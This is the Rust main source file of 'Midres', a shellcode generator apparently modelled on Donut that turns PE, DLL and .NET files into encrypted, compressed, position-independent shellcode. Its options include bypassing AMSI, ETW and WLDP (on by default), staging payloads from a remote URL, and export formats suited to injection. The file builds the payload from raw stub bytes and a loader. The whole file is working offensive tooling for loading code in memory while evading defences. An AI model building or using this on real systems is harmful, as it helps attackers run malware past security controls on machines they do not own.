//! Midres Generator - Main entry point
//! Donut-compatible shellcode generator written in Rust

mod config;
mod pe;
mod crypto;
mod compress;
mod output;
mod hash;
mod random;
mod instance;
mod error;
mod donut_instance;
mod loader_x64;
mod loader_x86;
mod bundle;

use anyhow::{Context, Result};
use clap::Parser;
use colored::Colorize;
use indicatif::{ProgressBar, ProgressStyle};
use std::fs;
use std::path::PathBuf;

use config::Config;
use error::MidresError;
use donut_instance::*;

/// Midres - Advanced Position-Independent Shellcode Generator
#[derive(Parser, Debug)]
#[command(name = "midres")]
#[command(author = "MidasRX")]
#[command(version = "1.0.0")]
#[command(about = "Generate position-independent shellcode from PE files", long_about = None)]
struct Args {
    /// Input PE/DLL/EXE/.NET assembly file
    #[arg(short, long)]
    input: PathBuf,

    /// Output file path
    #[arg(short, long)]
    output: PathBuf,

    /// Target architecture (x86, x64, x84 for both)
    #[arg(short, long, default_value = "x64")]
    arch: String,

    /// Output format (binary, base64, c, rust, python, powershell, csharp, hex, uuid)
    #[arg(short, long, default_value = "binary")]
    format: String,

    /// Enable payload encryption
    #[arg(short, long, default_value = "true")]
    encrypt: bool,

    /// Compression algorithm (none, lz4, zstd)
    #[arg(short, long, default_value = "lz4")]
    compress: String,

    /// Exit behavior (thread, process, block)
    #[arg(short = 'x', long, default_value = "thread")]
    exit: String,

    /// Bypass AMSI/ETW/WLDP (none, abort, continue)
    #[arg(short, long, default_value = "continue")]
    bypass: String,

    /// Class name for .NET assembly
    #[arg(long)]
    class: Option<String>,

    /// Method name for .NET assembly or DLL export
    #[arg(long)]
    method: Option<String>,

    /// Arguments to pass to the payload
    #[arg(long)]
    args: Option<String>,

    /// AppDomain name for .NET (random if not specified)
    #[arg(long)]
    domain: Option<String>,

    /// .NET runtime version (v2.0.50727, v4.0.30319)
    #[arg(long)]
    runtime: Option<String>,

    /// Run unmanaged EXE entrypoint as thread
    #[arg(long, default_value = "false")]
    thread: bool,

    /// Remote URL for staged payload
    #[arg(long)]
    url: Option<String>,

    /// Entropy level (1=none, 2=random, 3=full)
    #[arg(long, default_value = "3")]
    entropy: u32,

    /// Verbose output
    #[arg(short, long)]
    verbose: bool,
}

fn print_banner() {
    println!("{}", r#"
 ██╗   ██╗███████╗███╗   ██╗ ██████╗ ███╗   ███╗
 ██║   ██║██╔════╝████╗  ██║██╔═══██╗████╗ ████║
 ██║   ██║█████╗  ██╔██╗ ██║██║   ██║██╔████╔██║
 ╚██╗ ██╔╝██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║
  ╚████╔╝ ███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║
   ╚═══╝  ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝
    "#.bright_red());
    println!("  {} {}", "Version:".bright_cyan(), "1.0.0".white());
    println!("  {} {}\n", "Advanced Shellcode Generator".bright_cyan(), "[ Rust Edition ]".bright_yellow());
}

fn main() -> Result<()> {
    print_banner();
    
    let args = Args::parse();
    
    // Validate input file exists
    if !args.input.exists() {
        return Err(MidresError::InputNotFound(args.input.display().to_string()).into());
    }
    
    println!("{} {}", "[*]".bright_blue(), "Initializing configuration...".white());
    
    // Build configuration
    let config = Config::from_args(&args)?;
    
    if args.verbose {
        println!("{} Configuration:", "[+]".bright_green());
        println!("    {} {}", "Input:".bright_cyan(), args.input.display());
        println!("    {} {}", "Output:".bright_cyan(), args.output.display());
        println!("    {} {}", "Architecture:".bright_cyan(), config.arch_str());
        println!("    {} {}", "Format:".bright_cyan(), config.format_str());
        println!("    {} {}", "Encryption:".bright_cyan(), if config.encrypt { "enabled" } else { "disabled" });
        println!("    {} {}", "Compression:".bright_cyan(), config.compress_str());
    }
    
    // Progress bar setup
    let pb = ProgressBar::new(100);
    pb.set_style(ProgressStyle::default_bar()
        .template("{spinner:.green} [{elapsed_precise}] [{bar:40.cyan/blue}] {pos}% {msg}")
        .unwrap()
        .progress_chars("#>-"));
    
    // Step 1: Read and analyze input file
    pb.set_message("Reading input file...");
    pb.set_position(10);
    
    let input_data = fs::read(&args.input)
        .with_context(|| format!("Failed to read input file: {}", args.input.display()))?;
    
    println!("{} Read {} bytes from input", "[+]".bright_green(), input_data.len());
    
    // Step 1.5: Check for .NET single-file bundle
    pb.set_message("Checking for .NET bundle...");
    
    let (actual_data, is_bundle) = if let Some(bundle_info) = bundle::extract_main_assembly(&input_data) {
        println!("{} Detected .NET Single-File Bundle!", "[+]".bright_green());
        println!("    {} {}", "Bundle Version:".bright_cyan(), bundle_info.version);
        println!("    {} {} bytes", "Embedded Assembly:".bright_cyan(), bundle_info.data.len());
        (bundle_info.data, true)
    } else {
        (input_data.clone(), false)
    };
    
    // Step 2: Parse PE file
    pb.set_message("Analyzing PE structure...");
    pb.set_position(20);
    
    let pe_info = pe::analyze(&actual_data, &config)?;
    
    // For bundles, override the module type detection since we extracted the real .NET assembly
    let (is_dotnet, mod_type) = if is_bundle && !pe_info.is_dotnet {
        // The bundle host was detected as native, but we extracted a .NET assembly
        // Re-analyze the extracted assembly
        println!("{} Bundle contains .NET assembly, forcing .NET mode", "[+]".bright_yellow());
        (true, if pe_info.is_dll { DONUT_MODULE_NET_DLL } else { DONUT_MODULE_NET_EXE })
    } else {
        let is_dn = pe_info.is_dotnet;
        let mt = if is_dn {
            if pe_info.is_dll { DONUT_MODULE_NET_DLL } else { DONUT_MODULE_NET_EXE }
        } else {
            if pe_info.is_dll { DONUT_MODULE_DLL } else { DONUT_MODULE_EXE }
        };
        (is_dn, mt)
    };
    
    println!("{} Detected: {} ({})", 
        "[+]".bright_green(), 
        pe_info.module_type_str().bright_yellow(),
        pe_info.arch_str().bright_cyan());
    
    // Step 3: Determine .NET runtime and metadata
    pb.set_message("Analyzing .NET metadata...");
    pb.set_position(30);
    
    let runtime = args.runtime.as_deref().unwrap_or(
        if is_dotnet { "v4.0.30319" } else { "" }
    );
    
    let domain = args.domain.as_deref().unwrap_or("MidresDomain");
    let class_name = args.class.as_deref().unwrap_or("");
    let method_name = args.method.as_deref().unwrap_or("");
    let arguments = args.args.as_deref().unwrap_or("");
    
    if args.verbose && is_dotnet {
        println!("{} .NET Configuration:", "[+]".bright_green());
        println!("    {} {}", "Runtime:".bright_cyan(), runtime);
        println!("    {} {}", "Domain:".bright_cyan(), domain);
        if !class_name.is_empty() {
            println!("    {} {}", "Class:".bright_cyan(), class_name);
        }
        if !method_name.is_empty() {
            println!("    {} {}", "Method:".bright_cyan(), method_name);
        }
    }
    
    // Step 4: Process payload
    pb.set_message("Processing payload...");
    pb.set_position(40);
    
    let payload = if config.compression != midres_common::CompressionType::None {
        let compressed = compress::compress(&actual_data, config.compression)?;
        let compression_ratio = (compressed.len() as f64 / actual_data.len() as f64) * 100.0;
        println!("{} Compressed: {} -> {} bytes ({:.1}%)", 
            "[+]".bright_green(), 
            actual_data.len(), 
            compressed.len(),
            compression_ratio);
        compressed
    } else {
        println!("{} Using uncompressed payload: {} bytes", "[+]".bright_green(), actual_data.len());
        actual_data.clone()
    };
    
    // Generate IV for hashing (needed for both module and instance)
    let iv: u64 = rand::random();
    
    // Step 5: Build DONUT_MODULE structure
    pb.set_message("Building Donut module...");
    pb.set_position(50);
    
    let module_data = build_donut_module(
        &payload,
        mod_type,
        runtime,
        domain,
        class_name,
        method_name,
        arguments,
        iv,
    );
    
    println!("{} Built module: {} bytes", "[+]".bright_green(), module_data.len());
    
    // Step 6: Determine options
    let exit_opt = match args.exit.as_str() {
        "thread" => DONUT_OPT_EXIT_THREAD,
        "process" => DONUT_OPT_EXIT_PROCESS,
        "block" => DONUT_OPT_EXIT_BLOCK,
        _ => DONUT_OPT_EXIT_THREAD,
    };
    
    let bypass = match args.bypass.as_str() {
        "none" => DONUT_BYPASS_NONE,
        "abort" => DONUT_BYPASS_ABORT,
        "continue" => DONUT_BYPASS_CONTINUE,
        _ => DONUT_BYPASS_CONTINUE,
    };
    
    let entropy = match args.entropy {
        1 => DONUT_ENTROPY_NONE,
        2 => DONUT_ENTROPY_RANDOM,
        _ => DONUT_ENTROPY_DEFAULT,
    };
    
    // Step 7: Generate API hashes (using IV from earlier)
    pb.set_message("Computing API hashes...");
    pb.set_position(60);
    
    let api_hashes = get_api_hashes(iv);
    
    if args.verbose {
        println!("{} Generated {} API hashes with IV: {:#018x}", 
            "[+]".bright_green(), 
            api_hashes.len(),
            iv);
    }
    
    // Step 8: Build DONUT_INSTANCE
    pb.set_message("Building Donut instance...");
    pb.set_position(70);
    
    let instance_data = build_donut_instance(
        &module_data,
        &api_hashes,
        iv,
        entropy,
        exit_opt,
        bypass,
        is_dotnet,
    );
    
    println!("{} Built instance: {} bytes", "[+]".bright_green(), instance_data.len());
    
    // Step 9: Get loader shellcode
    pb.set_message("Loading shellcode stub...");
    pb.set_position(80);
    
    let loader = get_loader_shellcode(&config)?;
    println!("{} Loader size: {} bytes", "[+]".bright_green(), loader.len());
    
    // Step 10: Combine loader + instance (donut format)
    // Format: CALL + instance + POP + RSP_ALIGN + LOADER
    pb.set_message("Generating final shellcode...");
    pb.set_position(90);
    
    // x64 RSP alignment stub (from donut.c)
    let rsp_align: &[u8] = &[
        0x55,                         // push rbp
        0x48, 0x89, 0xE5,             // mov rbp, rsp
        0x48, 0x83, 0xE4, 0xF0,       // and rsp, -0x10
        0x48, 0x83, 0xEC, 0x20,       // sub rsp, 0x20
        0xE8, 0x05, 0x00, 0x00, 0x00, // call $+5
        0x48, 0x89, 0xEC,             // mov rsp, rbp
        0x5D,                         // pop rbp
        0xC3,                         // ret
    ];
    
    // Calculate sizes
    let inst_len = instance_data.len() as u32;
    
    // Build shellcode: CALL(5) + instance + POP(1) + RSP_ALIGN + LOADER
    let mut shellcode = Vec::with_capacity(5 + instance_data.len() + 1 + rsp_align.len() + loader.len());
    
    // E8 xx xx xx xx - CALL rel32 (skips over instance data)
    shellcode.push(0xE8);
    shellcode.extend_from_slice(&inst_len.to_le_bytes());
    
    // Instance data
    shellcode.extend_from_slice(&instance_data);
    
    // 59 - POP RCX (instance pointer now in RCX)
    shellcode.push(0x59);
    
    // RSP alignment for x64
    if config.arch == midres_common::Architecture::X64 {
        shellcode.extend_from_slice(rsp_align);
    }
    
    // Loader shellcode
    shellcode.extend_from_slice(&loader);
    
    // Step 11: Format and write output
    pb.set_message("Writing output...");
    pb.set_position(95);
    
    let formatted = output::format_output(&shellcode, config.format)?;
    fs::write(&args.output, &formatted)
        .with_context(|| format!("Failed to write output: {}", args.output.display()))?;
    
    pb.set_position(100);
    pb.finish_with_message("Complete!");
    
    println!("\n{} Shellcode generated successfully!", "[✓]".bright_green());
    println!("    {} {} bytes", "Size:".bright_cyan(), shellcode.len());
    println!("    {} {}", "Output:".bright_cyan(), args.output.display());
    println!("    {} {}", "Loader:".bright_cyan(), format!("{} bytes", loader.len()));
    println!("    {} {}", "Instance:".bright_cyan(), format!("{} bytes", instance_data.len()));
    
    // Print hash for verification
    let hash = sha2_hash(&shellcode);
    println!("    {} {}", "SHA256:".bright_cyan(), hash);
    
    Ok(())
}

fn get_loader_shellcode(config: &Config) -> Result<Vec<u8>> {
    // Load the pre-compiled donut loader shellcode
    // This matches the DONUT_INSTANCE structure exactly
    
    let loader = match config.arch {
        midres_common::Architecture::X64 => {
            loader_x64::LOADER_X64.to_vec()
        }
        midres_common::Architecture::X86 => {
            loader_x86::LOADER_X86.to_vec()
        }
        _ => {
            loader_x64::LOADER_X64.to_vec()
        }
    };
    
    Ok(loader)
}

fn sha2_hash(data: &[u8]) -> String {
    use sha2::{Sha256, Digest};
    let mut hasher = Sha256::new();
    hasher.update(data);
    hex::encode(hasher.finalize())
}
